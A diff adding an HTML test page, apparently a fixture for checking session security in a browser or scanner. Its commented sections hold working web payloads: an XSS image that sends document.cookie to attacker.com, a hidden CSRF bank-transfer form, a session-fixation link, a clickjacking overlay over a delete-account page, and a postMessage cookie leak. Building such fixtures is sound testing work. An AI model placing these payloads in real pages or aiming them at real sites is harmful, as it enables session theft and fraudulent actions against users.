@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Session Isolation Test</title>
+    <style>body { font-family: Arial; max-width: 800px; margin: 50px auto; padding: 20px; }</style>
+</head>
+<body>
+    <h1>Session Security Test</h1>
+    
+    <!-- Session token in URL (bad practice) -->
+    <p>Current session: <code id="session-id">sess_abc123xyz</code></p>
+    
+    <!-- XSS attempt to steal session -->
+    <div id="comment-section">
+        <div class="comment">
+            <strong>User:</strong> Great site!
+            <img src="x" onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
+        </div>
+    </div>
+    
+    <!-- CSRF attack -->
+    <form action="https://banking.example.com/transfer" method="POST" target="hidden-frame">
+        <input type="hidden" name="to" value="attacker_account">
+        <input type="hidden" name="amount" value="10000">
+        <input type="hidden" name="from" value="victim_account">
+    </form>
+    <iframe name="hidden-frame" style="display:none"></iframe>
+    
+    <!-- Session fixation attempt -->
+    <a href="https://example.com/login?sessionid=attacker_session">Login link with fixed session</a>
+    
+    <!-- Clickjacking for session actions -->
+    <div style="position:relative;opacity:0.01;z-index:999;">
+        <iframe src="https://example.com/settings/delete-account" 
+                style="position:absolute;top:0;left:0;width:500px;height:300px;"></iframe>
+    </div>
+    <button style="position:relative;z-index:1;">Click to win prize!</button>
+    
+    <!-- Local storage manipulation -->
+    <script>
+        // localStorage.setItem('auth_token', 'stolen_token_123');
+        // sessionStorage.setItem('session_data', JSON.stringify(userData));
+    </script>
+    
+    <!-- PostMessage attacks -->
+    <script>
+        // window.parent.postMessage({type: 'SESSION_DATA', data: document.cookie}, '*');
+    </script>
+    
+    <!-- Cookie manipulation -->
+    <img src="/set-cookie?session=malicious" style="display:none">
+    
+    <!-- Token in referrer -->
+    <a href="https://third-party.com/track">Link leaks referrer with token</a>
+    
+    <!-- Session timeout test -->
+    <meta http-equiv="refresh" content="3600;url=/logout">
+    
+</body>
+</html>
